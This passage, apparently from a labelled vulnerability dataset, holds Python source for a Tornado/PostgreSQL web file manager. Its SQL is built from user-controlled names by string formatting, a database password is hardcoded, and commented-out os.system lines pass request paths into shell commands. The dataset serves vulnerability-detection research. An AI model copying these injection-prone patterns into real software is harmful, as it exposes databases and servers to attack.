None:\n        origin = paths[0]\n    caller = next(x for x in stack if x[0] == origin)\n\n    statement = \"/* %s | %s:%d in %s */\\n\" % (lore.env.project, caller[0], caller[1], caller[2]) + statement\n    logger.debug(statement)\n    return statement, parameters\n\n\n@event.listens_for(Engine, \"after_cursor_execute\")\ndef time_sql_calls(conn, cursor, statement, parameters, context, executemany):\n    total = datetime.now() - conn.info['query_start_time'].pop(-1)\n    logger.info(\"SQL: %s\" % total)\n\n\n_after_replace_callbacks = []\ndef after_replace(func):\n    global _after_replace_callbacks\n    _after_replace_callbacks.append(func)\n/n/n/n", "label": 1}, {"id": "fa76c130ed80b9f5636cab41e88054536205c376", "code": "bzs/const.py/n/n\nuniversal_options_list = {\n    'author': 'Geoffrey, Tang.',\n    'copyright': 'Copyright 2016, Geoffrey Tang. All lefts reversed.',\n    'db-name': 'testdb',\n    'db-user': 'postgres',\n    'db-password': '123456',\n    'db-host-addr': '127.0.0.1',\n    'db-host-port': '8079',\n    'license': 'GNU GPL v3',\n    'server-name': 'Apache/2.4.1 (Linux 2.6.32)',\n    'time-format': '%a %Y/%m/%d, %H:%M:%S',\n    'time-zone': 'Asia/Shanghai',\n    'version': 'indev'\n}\n\ndef get_const(_):\n    return universal_options_list[_] if _ in universal_options_list else None\n/n/n/nbzs/db.py/n/n\nimport binascii\nimport copy\nimport datetime\nimport hashlib\nimport psycopg2\nimport pytz\nimport time\nimport uuid\n\nfrom bzs import const\n\ndef get_current_time():\n    \"\"\"Gets the current time, in float since epoch.\"\"\"\n    # return datetime.datetime.now(tz=pytz.timezone(const.get_const('time-zone')))\n    return float(time.time())\n\ndef get_new_uuid(uuid_, uuid_list=None):\n    \"\"\"Creates a new UUID that is not in 'uuid_list' if given.\"\"\"\n    if not uuid_:\n        uuid_ = uuid.uuid4().hex\n        if type(uuid_list) in [set, dict]:\n            while uuid_ in uuid_list:\n                uuid_ = uuid.uuid4().hex\n    return uuid_\n\n################################################################################\n\nclass DatabaseType:\n    def __init__(self):\n        self.connect_params = dict(\n            database=const.get_const('db-name'),\n            user=const.get_const('db-user'),\n            password=const.get_const('db-password'),\n            host=const.get_const('db-host-addr'),\n            port=const.get_const('db-host-port')\n        )\n        self._db = psycopg2.connect(**self.connect_params)\n        self._cur = None\n        return\n\n    def execute(self, command, **args):\n        self._cur = self._db.cursor()\n        try:\n            self._cur.execute(command, **args)\n            final_arr = self._cur.fetchall()\n        except psycopg2.ProgrammingError:\n            # We'll take this as granted... though risky.\n            final_arr = None\n        self._db.commit()\n        self._cur.close()\n        return final_arr\n\n    def init_db(self):\n        # Purge database of obsolete tables\n        self.execute(\"\"\"\n            DROP TABLE core;\n        \"\"\")\n        self.execute(\"\"\"\n            DROP TABLE users;\n        \"\"\")\n        self.execute(\"\"\"\n            DROP TABLE file_system;\n        \"\"\")\n        self.execute(\"\"\"\n            DROP TABLE file_storage;\n        \"\"\")\n        # Creating new tables in order to function\n        self.execute(\"\"\"\n            CREATE TABLE core (\n                index   TEXT,\n                data    BYTEA\n            );\n            CREATE TABLE users (\n                handle          TEXT,\n                password        TEXT,\n                usergroups      TEXT,\n                ip_address      TEXT[],\n                events          TEXT[],\n                usr_name        TEXT,\n                usr_description TEXT,\n                usr_email       TEXT,\n                usr_followers   TEXT[],\n                usr_friends     TEXT[]\n            );\n            CREATE TABLE file_system(\n                uuid        TEXT,\n                file_name   TEXT,\n                owner       TEXT,\n                upload_time DOUBLE PRECISION,\n                sub_folders TEXT[],\n                sub_files   TEXT[][]\n            );\n            CREATE TABLE file_storage (\n                uuid    TEXT,\n                size    BIGINT,\n                count   BIGINT,\n                hash    TEXT,\n                content BYTEA\n            );\n        \"\"\")\n        return\n    pass\n\nDatabase = DatabaseType()\n\n################################################################################\n\nclass FileStorageType:\n    st_uuid_idx = dict()\n    st_hash_idx = dict()\n    # Database entry\n    st_db = Database\n    # Hashing algorithm, could be md5, sha1, sha224, sha256, sha384, sha512\n    # sha384 and sha512 are not recommended due to slow speeds on 32-bit computers\n    hash_algo = hashlib.sha256\n\n    class UniqueFile:\n        def __init__(self, uuid_=None, size=0, count=1, hash_=None, master=None):\n            self.master = master\n            self.uuid = get_new_uuid(uuid_, self.master.st_uuid_idx)\n            self.master.st_uuid_idx[self.uuid] = self\n            self.size = size\n            self.count = count # The number of references\n            self.hash = hash_ # Either way... must specify this!\n            self.master.st_hash_idx[self.hash] = self\n            # Will not contain content, would be indexed in SQL.\n            return\n        pass\n\n    def __init__(self, db=Database):\n        return self.load_sql(db)\n\n    def load_sql(self, db=Database):\n        \"\"\"Loads index of all stored UniqueFiles in database.\"\"\"\n        self.st_db = db\n        for item in self.st_db.execute(\"SELECT uuid, size, count, hash FROM file_storage;\"):\n            s_uuid, s_size, s_count, s_hash = item\n            s_fl = self.UniqueFile(s_uuid, s_size, s_count, s_hash, self)\n            # Inject into indexer\n            self.st_uuid_idx[s_uuid] = s_fl\n            self.st_hash_idx[s_hash] = s_fl\n        return\n\n    def new_unique_file(self, content):\n        \"\"\"Creates a UniqueFile, and returns its UUID in string.\"\"\"\n        n_uuid = get_new_uuid(None, self.st_uuid_idx)\n        n_size = len(content)\n        n_count = 1\n        n_hash = self.hash_algo(content).hexdigest()\n        u_fl = self.UniqueFile(n_uuid, n_size, n_count, n_hash, master=self)\n        # Done indexing, now proceeding to process content into SQL\n        content = binascii.hexlify(content).decode('ascii')\n        self.st_db.execute(\"INSERT INTO file_storage (uuid, size, count, hash, content) VALUES ('%s', %d, %d, '%s', E'\\\\x%s');\" % (n_uuid, n_size, n_count, n_hash, content))\n        # Injecting file into main indexer\n        self.st_uuid_idx[n_uuid] = u_fl\n        self.st_hash_idx[n_hash] = u_fl\n        return n_uuid\n\n    def get_content(self, uuid_):\n        try:\n            u_fl = self.st_uuid_idx[uuid_]\n        except Exception:\n            return b''\n        # Got file handle, now querying file data\n        content = self.st_db.execute(\"SELECT content FROM file_storage WHERE uuid = '%s';\" % uuid_)\n        print(content)\n        return content\n    pass\n\nFileStorage = FileStorageType()\n\n################################################################################\n\nclass FilesystemType:\n    \"\"\"This is a virtual filesystem based on a relational PostgreSQL database.\n    We might call it a SQLFS. Its tree-topological structure enables it to index\n    files and find siblings quickly. Yet without the B-Tree optimization it would\n    not be easy to maintain a high performance.\n    \"\"\"\n    fs_uuid_idx = dict()\n    fs_root = None\n    fs_db = None\n\n    class fsNode:\n        \"\"\"This is a virtual node on a virtual filesystem SQLFS. The virtual node contains\n        the following data:\n\n            uuid        - The unique identifier: if node is a directory, then this uuid\n                          would be the identifier pointing to the directory; if node is\n                          a file, this identifier would be pointing to the UUID among\n                          the actual files instead of the filesystem.\n            is_dir      - Whether is a directory or not\n            filename    - The actual file / directory name given by the user\n            upload_time - The time uploaded / copied / moved to server\n            f_uuid      - If a file them this indicates its FileStorage UUID.\n\n        Other data designed to maintain the structure of the node includes:\n\n            master        - The filesystem itself.\n            sub_folder    - Removed after filesystem init, temporary use only.\n            sub_files     - Removed after filesystem init, temporary use only.\n            sub_items     - Set of children.\n            sub_names_idx - Contains same data as sub_items, but indexed by name.\n\n        Do process with caution, and use exported methods only.\n        \"\"\"\n\n        def __init__(self, is_dir, file_name, owner, uuid_=None, upload_time=None, sub_folders=set(), sub_files=set(), f_uuid=None, master=None):\n            # The filesystem / master of the node\n            self.master = master\n            # Assigning data\n            self.is_dir = is_dir\n            self.file_name = file_name\n            self.owner = owner\n            # Generate Universally Unique Identifier\n            self.uuid = get_new_uuid(uuid_, master.fs_uuid_idx)\n            master.fs_uuid_idx[self.uuid] = self\n            # Get upload time\n            self.upload_time = upload_time or get_current_time()\n            if not self.is_dir:\n                self.sub_folders = set()\n                self.sub_files = set()\n                self.f_uuid = f_uuid\n            else:\n                # Folder initialization needs to be accounted after init as whole by the main caller\n                self.sub_folders = sub_folders # Temporary\n                self.sub_files = sub_files # Temporary\n            # This is a traversal thing...\n            self.parent = None\n            self.sub_items = set()\n            self.sub_names_idx = dict()\n            return\n        pass\n\n    def __init__(self, db=Database):\n        return self.load_sqlfs(db)\n\n    def load_sqlfs(self, db=Database):\n        self.fs_db = db\n        for item in self.fs_db.execute(\"SELECT uuid, file_name, owner, upload_time, sub_folders, sub_files FROM file_system\"):\n            # Splitting tuple into parts\n            uuid_, file_name, owner, upload_time, sub_folders, sub_files = item\n            # Getting sub files which are expensive stored separately\n            n_sub_files = set()\n            for fil_idx in sub_files:\n                # This is where the order goes, BEAWARE\n                s_uuid = fil_idx[0]\n                s_file_name = fil_idx[1]\n                s_owner = fil_idx[2]\n                try:\n                    s_upload_time = float(fil_idx[3])\n                except:\n                    s_upload_time = get_current_time()\n                s_f_uuid = fil_idx[4]\n                # Pushing...\n                s_file = self.fsNode(False, s_file_name, s_owner, s_uuid, s_upload_time, f_uuid=s_f_uuid, master=self)\n                n_sub_files.add(s_file)\n                self.fs_uuid_idx[s_uuid] = s_file\n            # Getting sub folders as a set but not templating them\n            n_sub_folders = set() # Since reference is passed, should not manipulate this further\n            for fol_idx in sub_folders:\n                n_sub_folders.add(fol_idx)\n            fold_elem = self.fsNode(True, file_name, owner, uuid_, upload_time, n_sub_folders, n_sub_files, master=self)\n            self.fs_uuid_idx[uuid_] = fold_elem\n        # Done importing from SQL database, now attempting to refurbish connexions\n        for uuid_ in self.fs_uuid_idx:\n            item = self.fs_uuid_idx[uuid_]\n            if not item.is_dir:\n                continue\n            # Asserted that it was a folder.\n            for n_sub in item.sub_files:\n                item.sub_items.add(n_sub)\n                item.sub_names_idx[n_sub.file_name] = n_sub\n            for n_sub_uuid in item.sub_folders:\n                try:\n                    n_sub = self.fs_uuid_idx[n_sub_uuid]\n                    item.sub_items.add(n_sub)\n                    item.sub_names_idx[n_sub.file_name] = n_sub\n                except Exception:\n                    pass\n            del item.sub_files\n            del item.sub_folders\n        # Fixing parental occlusions\n        def iterate_fsnode(node):\n            for item in node.sub_items:\n                if item.parent:\n                    continue\n                # Never iterated before\n                item.parent = node\n                iterate_fsnode(item)\n            return\n        for uuid_ in self.fs_uuid_idx: # This would fix all nodes...\n            item = self.fs_uuid_idx[uuid_]\n            iterate_fsnode(item)\n        # Finding root and finishing parent connexions\n        for uuid_ in self.fs_uuid_idx: # Takes the first element that ever occured to me\n            item = self.fs_uuid_idx[uuid_]\n            while item.parent:\n                item = item.parent\n            self.fs_root = item\n            break\n        else:\n            self.make_root()\n        # Traversing root for filename indexing\n        def iterate_node_fn(node):\n            for item in node.sub_items:\n                node.sub_names_idx[item.file_name]\n        # All done, finished initialization\n        return\n\n    def make_root(self):\n        item = self.fsNode(True, '', 'System', master=self)\n        del item.sub_files\n        del item.sub_folders\n        item.sub_items = set()\n        item.parent = None\n        # Done generation, inserting.\n        self.fs_root = item\n        self.fs_uuid_idx[item.uuid] = item\n        # Inserting to SQL.\n        self.fs_db.execute(\"INSERT INTO file_system (uuid, file_name, owner, upload_time, sub_folders, sub_files) VALUES ('%s', '%s', '%s', %f, '{}', '{}');\" % (item.uuid, item.file_name, item.owner, item.upload_time))\n        return\n\n    def locate(self, path, parent=None):\n        \"\"\"Locate the fsNode() of the location 'path'. If 'parent' is given and\n        as it should be a fsNode(), the function look to the nodes directly\n        under this, non-recursively.\"\"\"\n        # On the case it is a referring location, path should be str.\n        if parent:\n            try:\n                item = parent.sub_names_idx[path]\n            except Exception:\n                return None\n            return item\n        # And it is not such a location.\n        # We assert that path should be list().\n        if type(path) == str:\n            path = path.split('/')\n            while '' in path:\n                path.remove('')\n        # Now got array, traversing...\n        item = self.fs_root\n        while path:\n            try:\n                item = item.sub_names_idx[path[0]]\n            except Exception:\n                return None # This object does not exist.\n            path = path[1:]\n        return item\n\n    def _sqlify_fsnode(self, item):\n        n_uuid = item.uuid\n        n_file_name = item.file_name\n        n_owner = item.owner\n        n_upload_time = item.upload_time\n        n_sub_folders = list()\n        n_sub_files = list()\n        for i_sub in item.sub_items:\n            if i_sub.is_dir:\n                n_sub_folders.append(\"\\\"%s\\\"\" % i_sub.uuid)\n            else:\n                s_attr = \"{%s, %s, %s, %s, %s}\" % (\n                    \"\\\"%s\\\"\" % i_sub.uuid,\n                    \"\\\"%s\\\"\" % i_sub.file_name,\n                    \"\\\"%s\\\"\" % i_sub.owner,\n                    \"\\\"%f\\\"\" % i_sub.upload_time,\n                    \"\\\"%s\\\"\" % i_sub.f_uuid\n                )\n                n_sub_files.append(s_attr)\n        # Formatting string\n        n_sub_folders_str = \"'{\" + \", \".join(i for i in n_sub_folders) + \"}'\"\n        n_sub_files_str = \"'{\" + \", \".join(i for i in n_sub_files) + \"}'\"\n        return (n_uuid, n_file_name, n_owner, n_upload_time, n_sub_folders_str, n_sub_files_str)\n\n    def _update_in_db(self, item):\n        # This applies to items in the\n        # We assert that item should be Node.\n        if type(item) == str:\n            item = self.locate(item)\n        if not item:\n            return False\n        # Giving a few but crucial assertions...\n        if not item.is_dir:\n            item = item.parent\n            if not item.is_dir:\n                return False # I should raise, by a matter of fact\n        # Collecting data\n        n_uuid, n_file_name, n_owner, n_upload_time, n_sub_folders_str, n_sub_files_str = self._sqlify_fsnode(item)\n        # Uploading / committing data\n        command = \"UPDATE file_system SET file_name = '%s', owner = '%s', upload_time = %f, sub_folders = %s, sub_files = %s WHERE uuid = '%s';\" % (n_file_name, n_owner, n_upload_time, n_sub_folders_str, n_sub_files_str, n_uuid)\n        self.fs_db.execute(command)\n        return True\n\n    def _insert_in_db(self, item):\n        \"\"\"Create filesystem record of directory 'item' inside database.\"\"\"\n        if not item.is_dir:\n            return False # Must be directory...\n        n_uuid, n_file_name, n_owner, n_upload_time, n_sub_folders_str, n_sub_files_str = self._sqlify_fsnode(item)\n        # Uploading / committing data\n        self.fs_db.execute(\"INSERT INTO file_system (uuid, file_name, owner, upload_time, sub_folders, sub_files) VALUES ('%s', '%s', '%s', %f, %s, %s);\" % (n_uuid, n_file_name, n_owner, n_upload_time, n_sub_folders_str, n_sub_files_str))\n        return\n\n    def get_content(self, item):\n        \"\"\"Gets binary content of the object (must be file) and returns the actual\n        content in bytes.\"\"\"\n        if type(item) == str:\n            item = self.locate(item)\n        if not item:\n            return b''\n        if item.is_dir:\n            return b''\n        return FileStorage.get_content(item.f_uuid)\n\n    def _remove_recursive(self, item):\n        \"\"\"Removes content of a single object and recursively call all its\n        children for recursive removal.\"\"\"\n        # We assert item is fsNode().\n        # Remove recursively.\n        for i_sub in item.sub_items:\n            self._remove_recursive(i_sub)\n        # Delete itself from filesystem.\n        del self.fs_uuid_idx[item.uuid]\n        # Delete itself from SQL database.\n        self.fs_db.execute(\"DELETE FROM file_system WHERE uuid = '%s';\" % item.uuid)\n        return\n\n    def remove(self, path):\n        \"\"\"Removes (recursively) all content of the folder / file itself and\n        all its subdirectories.\"\"\"\n        if type(path) == str:\n            path = self.locate(path)\n            if not path:\n                return False\n        # Done assertion, path is now fsNode().\n        par = path.parent\n        self._remove_recursive(path)\n        if par:\n            par.sub_items.remove(path)\n            del par.sub_names_idx[path.file_name]\n            self._update_in_db(par)\n        return True\n\n    def _copy_recursive(self, item, target_par, new_owner):\n        \"\"\"Copies content of a single object and recursively call all its\n        children for recursive copy, targeted as a child under target_par.\"\"\"\n        # We assert item, target_par are all fsNode().\n        target_node = target_par.sub_names_idx[item.file_name]\n        for i_sub in item.sub_items:\n            i_sub.parent = item\n            item.sub_names_idx[i_sub.file_name] = i_sub\n            self._copy_recursive(i_sub, target_node, new_owner)\n        # Insert into SQL database\n        item.uuid = get_new_uuid(None, self.fs_uuid_idx)\n        self.fs_uuid_idx[item.uuid] = item\n        item.upload_time = get_current_time()\n        if new_owner:\n            item.owner = new_owner # Assignment\n        if item.is_dir:\n            self._insert_in_db(item)\n        return\n\n    def copy(self, source, target_parent, new_owner=None):\n        \"\"\"Copies content of 'source' (recursively) and hang the target object\n        that was copied under the node 'target_parent'. If rename required please call\n        the related functions separatedly.\"\"\"\n        if type(source) == str:\n            source = self.locate(source)\n        if type(target_parent) == str:\n            target_parent = self.locate(target_parent)\n        if not source or not target_parent:\n            return False\n        # Done assertion, now proceed with deep copy\n        target = copy.deepcopy(source)\n        target.parent = target_parent\n        target_parent.sub_items.add(target)\n        target_parent.sub_names_idx[target.file_name] = target\n        self._copy_recursive(target, target_parent, new_owner)\n        # Update target_parent data and return\n        self._update_in_db(target_parent)\n        return True\n\n    def move(self, source, target_parent):\n        if type(source) == str:\n            source = self.locate(source)\n        if type(target_parent) == str:\n            target_parent = self.locate(target_parent)\n        if not source or not target_parent:\n            return False\n        # Moving an re-assigning tree structures\n        par = source.parent\n        par.sub_items.remove(source)\n        del par.sub_names_idx[source.file_name]\n        source.parent = target_parent\n        target_parent.sub_items.add(source)\n        target_parent.sub_names_idx[source.file_name] = source\n        # Updating SQL database.\n        self._update_in_db(par)\n        self._update_in_db(target_parent)\n        return\n\n    def rename(self, item, file_name):\n        \"\"\"Renames object 'item' into file_name.\"\"\"\n        if type(item) == str:\n            item = self.locate(item)\n            if not item:\n                return False\n        if item.parent:\n            del item.parent.sub_names_idx[item.file_name]\n            item.file_name = file_name\n            item.parent.sub_names_idx[item.file_name] = item\n        if item.is_dir:\n            self._update_in_db(item)\n        else:\n            self._update_in_db(item.parent)\n        return True\n\n    def chown(self, item, owner):\n        \"\"\"Assign owner of 'item' to new owner, recursively.\"\"\"\n        if type(item) == str:\n            item = self.locate(item)\n            if not item:\n                return False\n        def _chown_recursive(item_, owner_):\n            for sub_ in item_.sub_items:\n                _chown_recursive(sub_, owner_)\n            item_.owner = owner_\n            if item_.is_dir:\n                self._update_in_db(item_)\n            return\n        _chown_recursive(item, owner)\n        if not item.is_dir:\n            self._update_in_db(item.parent)\n        return True\n\n    def mkfile(self, path_parent, file_name, owner, content):\n        \"\"\"Inject object into filesystem, while passing in content. The content\n        itself would be indexed in FileStorage.\"\"\"\n        if type(path_parent) == str:\n            path_parent = self.locate(path_parent)\n            if not path_parent:\n                return False\n        n_uuid = FileStorage.new_unique_file(content)\n        n_fl = self.fsNode(False, file_name, owner, f_uuid=n_uuid, master=self)\n        # Updating tree connexions\n        n_fl.parent = path_parent\n        path_parent.sub_items.add(n_fl)\n        path_parent.sub_names_idx[file_name] = n_fl\n        self._update_in_db(path_parent)\n        # Indexing and return\n        self.fs_uuid_idx[n_fl.uuid] = n_fl\n        return True\n\n    def mkdir(self, path_parent, file_name, owner):\n        \"\"\"Inject folder into filesystem.\"\"\"\n        if type(path_parent) == str:\n            path_parent = self.locate(path_parent)\n            if not path_parent:\n                return False\n        n_fl = self.fsNode(True, file_name, owner, master=self)\n        # Updating tree connexions\n        n_fl.parent = path_parent\n        path_parent.sub_items.add(n_fl)\n        path_parent.sub_names_idx[file_name] = n_fl\n        self._update_in_db(path_parent)\n        self._insert_in_db(n_fl)\n        # Indexing and return\n        self.fs_uuid_idx[n_fl.uuid] = n_fl\n        return True\n\n    def listdir(self, path):\n        \"\"\"Creates a list of files in the directory 'path'. Attributes of the returned\n        result contains:\n\n            file-name   - File name\n            file-size   - File size\n            is-dir      - Whether is directory\n            owner       - The handle of the owner\n            upload-time - Time uploaded, in float since epoch.\n\n        The result should always be a list, and please index it with your own\n        habits or modify the code.\"\"\"\n        if type(path) == str:\n            path = self.locate(path)\n            if not path:\n                return []\n        # List directory, given the list(dict()) result...\n        dirs = list()\n        for item in path.sub_items:\n            attrib = dict()\n            # try:\n            attrib['file-name'] = item.file_name\n            attrib['file-size'] = 0 if item.is_dir else FileStorage.st_uuid_idx[item.f_uuid].size\n            attrib['is-dir'] = item.is_dir\n            attrib['owner'] = item.owner\n            attrib['upload-time'] = item.upload_time\n            # except:\n            #     continue\n            dirs.append(attrib)\n        # Give the results to downstream\n        return dirs\n\n    def shell(self):\n        \"\"\"Interactive shell for manipulating SQLFS. May be integrated into other\n        utilites in the (far) futuure. Possible commands are:\n\n            ls             - List content of current directory.\n            cat name       - View binary content of the object 'name'.\n            cd             - Change CWD into the given directory, must be relative.\n                             or use '..' to go to parent directory.\n            chown src usr  - Change ownership (recursively) of object 'src' to 'usr'.\n            rename src nam - Rename file / folder 'src' to 'nam'.\n            mkdir name     - Make directory of 'name' under this directory.\n            mkfile name    - Make empty file of 'name' under this directory.\n            rm name        - Remove (recursively) object of 'name' under this directory.\n            cp src dest    - Copy object 'src' to under 'dest (actual)' as destination.\n            mv src dest    - Move object 'src' to under 'dest (actual)' as destination.\n            q              - Exit shell.\n\n        Would be done in a infinite loop. Use 'q' to leave.\"\"\"\n        cwd = self.fs_root\n        cuser = 'system'\n        cwd_list = ['']\n        while True:\n            cwd_fl = ''.join((i + '/') for i in cwd_list)\n            print('root@postgres %s$ ' % cwd_fl, end='')\n            cmd_input = input()\n            cmd = cmd_input.split(' ')\n            op = cmd[0]\n            if op == 'ls':\n                res = self.listdir(cwd)\n                # Prettify the result\n                print('Owner       Upload Time         Size            Filename            ')\n                print('--------------------------------------------------------------------')\n                for item in res:\n                    print('%s%s%s%s' % (item['owner'].ljust(12), str(int(item['upload-time'])).ljust(20), str(item['file-size'] if not item['is-dir'] else '').ljust(16), item['file-name']))\n                print('Total: %d' % len(res))\n                print('')\n            elif op == 'cat':\n                dest = self.locate(cmd[1], parent=cwd)\n                print(self.get_content(dest))\n            elif op == 'cd':\n                if cmd[1] == '..':\n                    cwd_dest = cwd.parent\n                    if cwd_dest:\n                        cwd = cwd_dest\n                        cwd_list = cwd_list[:-1]\n                else:\n                    cwd_dest = cwd.sub_names_idx[cmd[1]]\n                    if cwd_dest:\n                        cwd = cwd_dest\n                        cwd_list.append(cmd[1])\n            elif op == 'chown':\n                dest = self.locate(cmd[1], parent=cwd)\n                self.chown(dest, cmd[2])\n            elif op == 'rename':\n                dest = self.locate(cmd[1], parent=cwd)\n                self.rename(dest, cmd[2])\n            elif op == 'mkdir':\n                self.mkdir(cwd, cmd[1], cuser)\n            elif op == 'mkfile':\n                self.mkfile(cwd, cmd[1], cuser, b'')\n            elif op == 'rm':\n                self.remove(self.locate(cmd[1], parent=cwd))\n            elif op == 'cp':\n                src = self.locate(cmd[1], parent=cwd)\n                self.copy(src, cmd[2])\n            elif op == 'mv':\n                src = self.locate(cmd[1], parent=cwd)\n                self.move(src, cmd[2])\n            elif op == 'q':\n                break\n            else:\n                print('Unknown command \"%s\".' % op)\n        return\n    pass\n\nFilesystem = FilesystemType()\n\n################################################################################\n/n/n/nbzs/module_files.py/n/n\nimport base64\nimport binascii\nimport io\nimport json\nimport re\nimport time\nimport tornado\n\nfrom bzs import const\nfrom bzs import db\nfrom bzs import files\nfrom bzs import preproc\nfrom bzs import users\n\n# TODO: Remove this!\nimport os\n\ndef encode_str_to_hexed_b64(data):\n    return binascii.b2a_hex(base64.b64encode(data.encode('utf-8'))).decode('utf-8')\ndef decode_hexed_b64_to_str(data):\n    return base64.b64decode(binascii.unhexlify(data.encode('utf-8'))).decode('utf-8')\n\n################################################################################\n\nclass FilesListHandler(tornado.web.RequestHandler):\n    SUPPORTED_METHODS = ['GET', 'HEAD']\n\n    @tornado.web.asynchronous\n    @tornado.gen.coroutine\n    def get(self, target_path):\n        \"\"\"/files/list/HEXED_BASE64_STRING_OF_PATH/\"\"\"\n        # Another concurrency blob...\n        future = tornado.concurrent.Future()\n\n        def get_final_html_async(target_path):\n            # Getting file template.\n            file_temp = files.get_static_data('./static/files.html')\n\n            # Retrieving list operation target.\n            try:\n                target_path = decode_hexed_b64_to_str(target_path)\n            except:\n                target_path = '/'\n            if not target_path:\n                target_path = '/'\n\n            # Getting hierarchical file path\n            files_hierarchy = target_path.split('/')\n            files_hierarchy_list = list()\n            while '' in files_hierarchy:\n                files_hierarchy.remove('')\n            files_hierarchy = [''] + files_hierarchy\n            files_hierarchy_cwd = ''\n            for i in range(0, len(files_hierarchy)):\n                files_hierarchy[i] += '/'\n                files_hierarchy_cwd += files_hierarchy[i]\n                files_hierarchy_list.append(dict(\n                    folder_name=files_hierarchy[i],\n                    href_path='/files/list/%s' % encode_str_to_hexed_b64(files_hierarchy_cwd),\n                    disabled=(i == len(files_hierarchy) - 1)))\n                continue\n\n            # Getting current directory content\n            files_attrib_list = list()\n            for f_handle in db.Filesystem.listdir(target_path):\n                try:\n                    file_name = f_handle['file-name']\n                    actual_path = target_path + file_name\n                    attrib = dict()\n                    attrib['file-name'] = file_name\n                    attrib['file-size'] = f_handle['file-size']\n                    attrib['owner'] = f_handle['owner']\n                    attrib['date-uploaded'] = time.strftime(const.get_const('time-format'), time.localtime(f_handle['upload-time']))\n                    # Encoding MIME types\n                    if f_handle['is-dir']:\n                        attrib['mime-type'] = 'directory/folder'\n                    else:\n                        attrib['mime-type'] = files.guess_mime_type(file_name)\n                    attrib['file-name'] = f_handle['file-name']\n                    # Encoding hyperlinks\n                    if attrib['mime-type'] == 'directory/folder':\n                        attrib['target-link'] = '/files/list/%s' % encode_str_to_hexed_b64(actual_path + '/')\n                    else:\n                        attrib['target-link'] = '/files/download/%s/%s' % (encode_str_to_hexed_b64(actual_path), file_name)\n                    attrib['uuid'] = encode_str_to_hexed_b64(actual_path)\n                    files_attrib_list.append(attrib)\n                except Exception:\n                    pass\n            cwd_uuid = encode_str_to_hexed_b64(files_hierarchy_cwd)\n\n            # File actually exists, sending data\n            working_user = users.get_user_by_cookie(\n                self.get_cookie('user_active_login', default=''))\n            file_temp = preproc.preprocess_webpage(file_temp, working_user,\n                files_attrib_list=files_attrib_list,\n                files_hierarchy_list=files_hierarchy_list,\n                cwd_uuid=cwd_uuid)\n            future.set_result(file_temp)\n        tornado.ioloop.IOLoop.instance().add_callback(get_final_html_async,\n            target_path)\n        file_temp = yield future\n\n        self.set_status(200, \"OK\")\n        self.add_header('Cache-Control', 'max-age=0')\n        self.add_header('Connection', 'close')\n        self.add_header('Content-Type', 'text/html')\n        self.add_header('Content-Length', str(len(file_temp)))\n        self.write(file_temp)\n        self.flush()\n        self.finish()\n        return self\n\n    head=get\n    pass\n\n################################################################################\n\nclass FilesDownloadHandler(tornado.web.RequestHandler):\n    SUPPORTED_METHODS = ['GET', 'HEAD']\n\n    @tornado.web.asynchronous\n    @tornado.gen.coroutine\n    def get(self, file_path, file_name):\n        # Something that I do not wish to write too many times..\n        def invoke_404():\n            self.set_status(404, \"Not Found\")\n            self._headers = tornado.httputil.HTTPHeaders()\n            self.add_header('Content-Length', '0')\n            self.flush()\n            return\n\n        # Get file location (exactly...)\n        try:\n            file_path = decode_hexed_b64_to_str(file_path)\n        except Exception:\n            file_path = ''\n        if not file_path:\n            invoke_404()\n            return\n\n        # Asynchronous web request...\n        file_block_size = 64 * 1024 # 64 KiB / Chunk\n        file_block = bytes()\n        file_data = None\n\n        future = tornado.concurrent.Future()\n        def inquire_data_async():\n            _tf_data = db.Filesystem.get_content(file_path)\n            future.set_result(_tf_data)\n        tornado.ioloop.IOLoop.instance().add_callback(inquire_data_async)\n        file_data = yield future\n        file_stream = io.BytesIO(file_data)\n\n        self.set_status(200, \"OK\")\n        self.add_header('Cache-Control', 'max-age=0')\n        self.add_header('Connection', 'close')\n        self.add_header('Content-Type', 'application/x-download')\n        self.add_header('Content-Length', str(len(file_data)))\n\n        while file_stream.tell() < len(file_data):\n            byte_pos = file_stream.tell()\n            # Entry to the concurrency worker\n            future = tornado.concurrent.Future()\n            # Concurrent worker\n            def retrieve_data_async():\n                block = file_stream.read(file_block_size)\n                future.set_result(block)\n            # Injection and pending\n            tornado.ioloop.IOLoop.instance().add_callback(retrieve_data_async)\n            # Reset or read\n            file_block = yield future\n            self.write(file_block)\n            file_block = None\n            self.flush()\n        file_block = None\n        self.finish()\n\n        # Release memory...\n        file_stream = None\n        file_data = None\n        return self\n\n    head=get\n    pass\n\n################################################################################\n\nclass FilesOperationHandler(tornado.web.RequestHandler):\n    SUPPORTED_METHODS = ['POST']\n\n    @tornado.web.asynchronous\n    @tornado.gen.coroutine\n    def post(self):\n        # Another concurrency blob...\n        future = tornado.concurrent.Future()\n\n        def get_final_html_async():\n            operation_content_raw = self.request.body\n            operation_content = json.loads(operation_content_raw.decode('utf-8', 'ignore'))\n            action = operation_content['action']\n            sources = operation_content['source']\n            if type(sources) == list:\n                for i in range(0, len(sources)):\n                    try:\n                        sources[i] = decode_hexed_b64_to_str(sources[i])\n                    except:\n                        pass\n            else:\n                sources = decode_hexed_b64_to_str(sources)\n            if action in ['copy', 'move']:\n                try:\n                    target = decode_hexed_b64_to_str(operation_content['target'])\n                except:\n                    target = '/'\n            elif action in ['rename', 'new-folder']:\n                try:\n                    target = operation_content['target']\n                except:\n                    target = sources # I am not handling more exceptions as this is brutal enough\n            # Done assigning values, now attempting to perform operation\n            if action == 'copy':\n                for source in sources:\n                    # os.system('cp \"D:%s\" \"D:%s\"' % (source, target))\n                    print('copy', source, target)\n                    db.Filesystem.copy(source, target, new_owner='user-cp')\n            elif action == 'move':\n                for source in sources:\n                    # os.system('mv \"D:%s\" \"D:%s\"' % (source, target))\n                    print('move', source, target)\n                    db.Filesystem.move(source, target)\n            elif action == 'delete':\n                for source in sources:\n                    # os.system('rm \"D:%s\"' % source)\n                    print('delete', source)\n                    db.Filesystem.remove(source)\n            elif action == 'rename':\n                # os.system('rename \"D:%s\" \"%s\"' % (sources, target))\n                print('rename', sources, target)\n                db.Filesystem.rename(sources, target)\n                print(db.Filesystem.listdir('/'))\n            elif action == 'new-folder':\n                # os.system('mkdir \"D:%s%s\"' % (sources, target))\n                print('mkdir', sources)\n                db.Filesystem.mkdir(sources, target, 'user-nf')\n            future.set_result('')\n        tornado.ioloop.IOLoop.instance().add_callback(get_final_html_async)\n        file_temp = yield future\n\n        self.set_status(200, \"OK\")\n        self.add_header('Cache-Control', 'max-age=0')\n        self.add_header('Connection', 'close')\n        self.add_header('Content-Type', 'text/html')\n        self.add_header('Content-Length', 